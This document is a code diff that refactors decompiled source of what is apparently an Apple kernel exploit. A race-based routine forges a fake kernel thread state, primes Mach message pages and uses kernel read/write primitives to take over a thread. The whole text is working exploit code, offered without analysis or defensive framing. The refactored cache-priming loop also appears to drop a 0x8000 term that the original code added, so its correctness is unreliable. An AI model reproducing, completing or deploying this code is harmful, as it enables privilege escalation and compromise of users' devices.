@@ -154,6 +154,25 @@ typedef struct VmcopyTriggerThreadBlock
   semaphore_t resumeSemaphore;
 } VmcopyTriggerThreadBlock;
 
+enum
+{
+  VMCOPY_TARGET_THREAD_KADDR_OFFSET = 360,
+  VMCOPY_CHILD_THREAD_KADDR_OFFSET = 376,
+  VMCOPY_FAKE_THREAD_STATE_OFFSET = 384,
+  VMCOPY_FAKE_THREAD_STATE_BYTES = 0x110,
+  VMCOPY_FAKE_THREAD_AST_OFFSET = 392,
+  VMCOPY_FAKE_WAIT_LINK_OFFSET = 624,
+  VMCOPY_FAKE_MSG_BACKPTR_OFFSET = 632,
+  VMCOPY_FAKE_MARKER_OFFSET = 616,
+  VMCOPY_FAKE_MARKER2_OFFSET = 640,
+  VMCOPY_FAKE_FLAGS_OFFSET = 652,
+  VMCOPY_FAKE_CONTINUATION_OFFSET = 552,
+  VMCOPY_MESSAGE_KADDR_OFFSET = 664,
+  VMCOPY_CAPTURED_THREAD_OFFSET = 672,
+  VMCOPY_MARKER32 = 0xC0C0C0C0u,
+  VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
+};
+
 static inline void vmcopy_init_race_thread_block(
         VmcopyRaceThreadBlock *block,
         __int64 *state,
@@ -282,6 +301,35 @@ static inline void vmcopy_terminate_thread_list(thread_act_t *threads, size_t th
     if ( thread )
       thread_terminate(thread);
   }
+}
+
+static inline void vmcopy_prepare_fake_thread_state(
+        __int64 state,
+        natural_t suspendedThreadState[0x44],
+        uint64_t messageKaddr)
+{
+  memset(suspendedThreadState, 0, VMCOPY_FAKE_THREAD_STATE_BYTES);
+  memset((void *)(state + VMCOPY_FAKE_THREAD_STATE_OFFSET), 0, VMCOPY_FAKE_THREAD_STATE_BYTES);
+
+  *(uint64_t *)(state + VMCOPY_FAKE_THREAD_STATE_OFFSET) =
+    *(uint64_t *)(state + VMCOPY_TARGET_THREAD_KADDR_OFFSET);
+  *(uint64_t *)(state + VMCOPY_FAKE_THREAD_AST_OFFSET) = VMCOPY_MARKER32;
+  *(uint64_t *)(state + VMCOPY_FAKE_CONTINUATION_OFFSET) =
+    *(uint64_t *)(state + VMCOPY_CHILD_THREAD_KADDR_OFFSET);
+  *(uint64_t *)(state + VMCOPY_FAKE_MARKER2_OFFSET) = qword_48010;
+  *(uint64_t *)(state + VMCOPY_FAKE_WAIT_LINK_OFFSET) = qword_48030;
+  *(uint32_t *)(state + VMCOPY_FAKE_FLAGS_OFFSET) = 0;
+  *(uint64_t *)(state + VMCOPY_FAKE_MSG_BACKPTR_OFFSET) = messageKaddr + 0x7F00;
+  *(uint64_t *)(state + VMCOPY_FAKE_MARKER_OFFSET) = VMCOPY_MARKER64;
+  *(uint64_t *)(state + VMCOPY_MESSAGE_KADDR_OFFSET) = messageKaddr;
+}
+
+static inline void vmcopy_prime_fake_message_pages(__int64 kreadCtx, uint64_t messageKaddr)
+{
+  flush_cpu_cache(kreadCtx, messageKaddr, (int)VMCOPY_MARKER32);
+
+  for ( int64_t pageOffset = -0x4000; pageOffset < 0x8000; pageOffset += 0x4000 )
+    flush_cpu_cache(kreadCtx, messageKaddr + pageOffset + 0x8000, (int)(pageOffset + VMCOPY_MARKER32));
 }
 
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
@@ -7916,7 +7964,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   struct_krwCtx *v74; // x22
   __int64 v75; // x0
   mach_vm_address_t v76; // x1
-  unsigned __int64 v77; // x22
   __int64 v78; // x25
   __int64 v79; // x8
   uint32_t *v80; // x9
@@ -8242,40 +8289,8 @@ LABEL_68:
     v75 = kread_u64_value(*(uint64_t *)(someStruct + 8), qword_48008 + v73);
     *(uint64_t *)(someStruct + 376) = krw_xpac_vaddr_2(v74, v75);
     v76 = send_port_alloc_msg(someStruct, 0x10000);
-    *(uint64_t *)(someStruct + 664) = v76;
-    memset(suspendedThreadState, 0, sizeof(suspendedThreadState));
-    *(__int128 *)(someStruct + 624) = 0u;
-    *(__int128 *)(someStruct + 640) = 0u;
-    *(__int128 *)(someStruct + 592) = 0u;
-    *(__int128 *)(someStruct + 608) = 0u;
-    *(__int128 *)(someStruct + 560) = 0u;
-    *(__int128 *)(someStruct + 576) = 0u;
-    *(__int128 *)(someStruct + 528) = 0u;
-    *(__int128 *)(someStruct + 544) = 0u;
-    *(__int128 *)(someStruct + 496) = 0u;
-    *(__int128 *)(someStruct + 512) = 0u;
-    *(__int128 *)(someStruct + 464) = 0u;
-    *(__int128 *)(someStruct + 480) = 0u;
-    *(__int128 *)(someStruct + 432) = 0u;
-    *(__int128 *)(someStruct + 448) = 0u;
-    *(__int128 *)(someStruct + 400) = 0u;
-    *(__int128 *)(someStruct + 416) = 0u;
-    *(uint64_t *)(someStruct + 384) = *(uint64_t *)(someStruct + 360);
-    *(uint64_t *)(someStruct + 392) = 3233857728LL;
-    *(uint64_t *)(someStruct + 552) = *(uint64_t *)(someStruct + 376);
-    *(uint64_t *)(someStruct + 640) = qword_48010;
-    *(uint64_t *)(someStruct + 624) = qword_48030;
-    *(uint32_t *)(someStruct + 652) = 0;
-    *(uint64_t *)(someStruct + 632) = v76 + 32512;
-    *(uint64_t *)(someStruct + 616) = 0xC0C0C0C0C0C0C0C0LL;
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v76, -1061109568);
-    v77 = -16384;
-    do
-    {
-      flush_cpu_cache(*(uint64_t *)(someStruct + 8), v77 + *(uint64_t *)(someStruct + 664) + 0x8000, v77 - 1061076800);
-      v77 += 0x4000LL;
-    }
-    while ( v77 < 0x8000 );
+    vmcopy_prepare_fake_thread_state(someStruct, suspendedThreadState, v76);
+    vmcopy_prime_fake_message_pages(*(uint64_t *)(someStruct + 8), v76);
     memcpy(*(void **)(someStruct + 24), __dst, 0x130u);
     thread_set_state(*(uint32_t *)(someStruct + 672), 6, (thread_state_t)(someStruct + 384), 0x44u);
     v78 = kread_u64_value(*(uint64_t *)(someStruct + 8), v100 + 296);
